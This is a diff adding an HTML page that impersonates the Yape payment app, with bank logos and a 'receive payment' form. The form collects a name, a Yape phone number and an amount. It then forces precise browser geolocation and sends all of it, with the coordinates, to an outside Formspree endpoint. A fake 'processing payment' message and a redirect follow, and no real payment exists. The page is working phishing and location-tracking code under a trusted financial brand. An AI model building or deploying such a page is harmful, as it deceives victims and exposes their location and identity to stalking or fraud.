@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yape Cobranza - Recibir Pago</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            border-top: 5px solid #673AB7; /* Color de Yape similar */
+        }
+
+        .payment-methods-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .payment-methods-bar img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+            background-color: white;
+            padding: 8px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .payment-methods-bar img:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        }
+
+        .payment-methods-bar img:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            margin-bottom: 40px;
+            padding: 30px;
+            text-align: center;
+        }
+        .header img {
+            width: 350px; /* Logo de Yape grande (tipo banner) */
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 1.8em;
+            color: #673AB7;
+            margin-bottom: 10px;
+        }
+        .header p {
+            font-size: 1.1em;
+            color: #555;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #444;
+        }
+        .form-group input {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #673AB7; /* Color de Yape */
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 1.1em;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #5a2e9b;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        /* Estilos para inputs deshabilitados */
+        input:disabled {
+            background-color: #e9ecef; /* Un gris claro */
+            cursor: not-allowed;
+        }
+        #status-message {
+            margin-top: 25px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #4CAF50; /* Green for success, red for error */
+            text-align: center;
+        }
+        .error {
+            color: #F44336; /* Rojo para error */
+            margin-top: 10px;
+        }
+        #results {
+            margin-top: 30px;
+            text-align: left;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+            display: none; /* Oculto inicialmente */
+        }
+        #results h3 {
+            color: #673AB7;
+            margin-bottom: 15px;
+        }
+        #results p {
+            margin-bottom: 8px;
+            font-size: 1em;
+        }
+        #results strong {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="payment-methods-bar">
+            <img src="bcp.png" alt="Logo BCP">
+            <img src="plin.png" alt="Logo Plin">
+            <img src="interbank.png" alt="Logo Interbank">
+        </div>
+        <div class="header">
+            <img src="yape.png" alt="Logo de Yape Personalizado">
+            <h1>Recibir Yapeo - Solicitud de Pago</h1>
+            <p>Ingresa tus datos para recibir el pago de forma segura.</p>
+        </div>
+
+        <div class="form-group">
+            <label for="amount">Monto a recibir (S/):</label>
+            <input type="number" id="amount" placeholder="Ej: 50.00" step="0.01" min="0.01" max="500" required
+                   oninput="if(this.value > 500) this.value=500;">
+        </div>
+
+        <div class="form-group">
+            <label for="beneficiaryName">Nombre del beneficiario:</label>
+            <input type="text" id="beneficiaryName" placeholder="Ej: Juan G. Gonzales Q." required
+                   pattern="^[a-zA-Z\s.]+$" title="Solo letras, espacios y puntos">
+        </div>
+
+        <div class="form-group">
+            <label for="yapeNumber">Número de Yape:</label>
+            <input type="text" id="yapeNumber" placeholder="Ej: 987654321" required
+                   pattern="^\d{9}$" maxlength="9" title="Debe tener exactamente 9 dígitos numéricos">
+        </div>
+        <div class="form-group">
+            <label for="concept">Concepto (opcional):</label>
+            <input type="text" id="concept" placeholder="Ej: Venta de producto">
+        </div>
+
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+
+        <button id="request-button">Solicitar Pago</button>
+
+        <div id="status-message">
+            <img id="loading-gif" src="loading.gif" alt="Cargando..." style="display: none; height: 50px; margin: 10px auto;">
+        </div>
+
+        <div id="results" style="display: none;">
+            <h3>Datos de la Solicitud Recibida:</h3>
+            <p>Nombre: <strong id="result-beneficiary-name"></strong></p>
+            <p>Monto: <strong id="result-amount"></strong></p>
+            <p>Número Yape: <strong id="result-yape-number"></strong></p>
+            <p>Concepto: <strong id="result-concept"></strong></p>
+        </div>
+    </div>
+
+    <script>
+        // *** REEMPLAZA ESTO con tu URL de Formspree ***
+        const FORMSPREE_FORM_URL = 'https://formspree.io/f/xldleerk'; // Ej: https://formspree.io/f/abcdefgh
+
+        const requestButton = document.getElementById('request-button');
+        const statusMessageDiv = document.getElementById('status-message');
+        const loadingGif = document.getElementById('loading-gif');
+        const resultsDiv = document.getElementById('results');
+
+        // Referencias a todos los inputs
+        const amountInput = document.getElementById('amount');
+        const beneficiaryNameInput = document.getElementById('beneficiaryName');
+        const yapeNumberInput = document.getElementById('yapeNumber');
+        const conceptInput = document.getElementById('concept');
+        const latitudeInput = document.getElementById('latitude'); // Nuevo
+        const longitudeInput = document.getElementById('longitude'); // Nuevo
+
+        // Colección de todos los inputs para deshabilitar/habilitar fácilmente
+        const allInputs = [amountInput, beneficiaryNameInput, yapeNumberInput, conceptInput];
+
+        // Función para deshabilitar todos los inputs
+        function disableInputs(disabled) {
+            allInputs.forEach(input => {
+                input.disabled = disabled;
+            });
+            requestButton.disabled = disabled; // También deshabilitar el botón
+        }
+
+        // Limpiar el estado al cargar la página por primera vez
+        window.onload = function() {
+            loadingGif.style.display = 'none';
+            statusMessageDiv.textContent = '';
+            statusMessageDiv.className = '';
+            resultsDiv.style.display = 'none';
+            disableInputs(false); // Asegurarse de que los inputs y el botón estén habilitados al cargar
+        };
+
+        requestButton.addEventListener('click', function() {
+            // 1. Validaciones de formulario (antes de pedir ubicación)
+            if (!amountInput.checkValidity() || !beneficiaryNameInput.checkValidity() || !yapeNumberInput.checkValidity()) {
+                statusMessageDiv.className = 'error';
+                statusMessageDiv.textContent = 'Por favor, corrige los campos resaltados para continuar.';
+                loadingGif.style.display = 'none';
+                disableInputs(false); // Mantener habilitado para corrección
+                return;
+            }
+
+            const amount = parseFloat(amountInput.value);
+            const beneficiaryName = beneficiaryNameInput.value.trim();
+            const yapeNumber = yapeNumberInput.value.trim();
+            const concept = conceptInput.value;
+
+            // Validaciones JavaScript adicionales
+            if (amount <= 0 || amount > 500) {
+                statusMessageDiv.className = 'error';
+                statusMessageDiv.textContent = 'El monto debe ser un número positivo y no mayor a S/ 500.';
+                loadingGif.style.display = 'none';
+                disableInputs(false);
+                return;
+            }
+
+            const namePattern = /^[a-zA-Z\s.]+$/;
+            if (!namePattern.test(beneficiaryName)) {
+                statusMessageDiv.className = 'error';
+                statusMessageDiv.textContent = 'El nombre solo puede contener letras, espacios y puntos.';
+                loadingGif.style.display = 'none';
+                disableInputs(false);
+                return;
+            }
+
+            const yapeNumberPattern = /^\d{9}$/;
+            if (!yapeNumberPattern.test(yapeNumber)) {
+                statusMessageDiv.className = 'error';
+                statusMessageDiv.textContent = 'El número de Yape debe tener exactamente 9 dígitos numéricos.';
+                loadingGif.style.display = 'none';
+                disableInputs(false);
+                return;
+            }
+
+            // Si todas las validaciones de formulario pasan, entonces solicitar la ubicación
+            statusMessageDiv.textContent = 'Solicitando ubicación...';
+            statusMessageDiv.className = ''; // Limpiar errores previos
+            loadingGif.style.display = 'block';
+            disableInputs(true); // Deshabilita los campos y el botón mientras se pide la ubicación
+
+            // 2. Solicitar Ubicación
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        // Ubicación obtenida con éxito
+                        latitudeInput.value = position.coords.latitude;
+                        longitudeInput.value = position.coords.longitude;
+
+                        // Datos a enviar a Formspree
+                        const formData = new FormData();
+                        formData.append('Monto', amount.toFixed(2));
+                        formData.append('NombreBeneficiario', beneficiaryName);
+                        formData.append('NumeroYape', yapeNumber);
+                        formData.append('Concepto', concept);
+                        formData.append('Latitud', position.coords.latitude);
+                        formData.append('Longitud', position.coords.longitude);
+                        formData.append('FechaHora', new Date().toLocaleString()); // Para tener un registro del tiempo
+
+                        try {
+                            // Enviar datos a Formspree
+                            const response = await fetch(FORMSPREE_FORM_URL, {
+                                method: 'POST',
+                                body: formData,
+                                headers: {
+                                    'Accept': 'application/json' // Importante para Formspree
+                                }
+                            });
+
+                            if (response.ok) {
+                                // Datos enviados con éxito a Formspree
+                                statusMessageDiv.textContent = 'Datos enviados. Procesando pago...';
+                                loadingGif.style.display = 'block';
+
+                                // Simulación de procesamiento y redirección después de 7 segundos
+                                setTimeout(() => {
+                                    const queryParams = new URLSearchParams({
+                                        status: 'success',
+                                        name: beneficiaryName,
+                                        amount: amount.toFixed(2),
+                                        yapeNum: yapeNumber,
+                                        concept: concept,
+                                        lat: position.coords.latitude,
+                                        lon: position.coords.longitude
+                                    }).toString();
+
+                                    window.location.href = `success.html?${queryParams}`;
+
+                                }, 7000); // 7 segundos
+
+                            } else {
+                                // Error al enviar a Formspree
+                                statusMessageDiv.className = 'error';
+                                statusMessageDiv.textContent = 'Error al enviar datos a Formspree. Por favor, inténtalo de nuevo.';
+                                loadingGif.style.display = 'none';
+                                disableInputs(false); // Habilitar para reintento
+                            }
+                        } catch (error) {
+                            // Error de red al enviar a Formspree
+                            console.error('Error de red al enviar a Formspree:', error);
+                            statusMessageDiv.className = 'error';
+                            statusMessageDiv.textContent = 'Error de conexión. Por favor, verifica tu internet e inténtalo de nuevo.';
+                            loadingGif.style.display = 'none';
+                            disableInputs(false);
+                        }
+
+                    },
+                    (error) => {
+                        // Error al obtener la ubicación (usuario denegó o algún otro error)
+                        console.error('Error al obtener la ubicación:', error);
+                        statusMessageDiv.className = 'error';
+                        // Mensaje amigable al usuario sin especificar por qué falló la ubicación
+                        statusMessageDiv.textContent = 'No se pudo obtener tu ubicación. Por favor, permite el acceso y vuelve a intentarlo.';
+                        loadingGif.style.display = 'none';
+                        disableInputs(false); // Habilitar para que el usuario pueda intentar de nuevo
+                    },
+                    {
+                        enableHighAccuracy: true, // Solicitar la mejor precisión posible
+                        timeout: 10000,           // Tiempo máximo para obtener la ubicación (10 segundos)
+                        maximumAge: 0             // No usar una ubicación en caché, siempre intentar obtener una nueva
+                    }
+                );
+            } else {
+                // Navegador no soporta Geolocalización
+                statusMessageDiv.className = 'error';
+                statusMessageDiv.textContent = 'Tu navegador no soporta la geolocalización. No se puede continuar.';
+                loadingGif.style.display = 'none';
+                disableInputs(false);
+            }
+        });
+    </script>
+</body>
+</html>
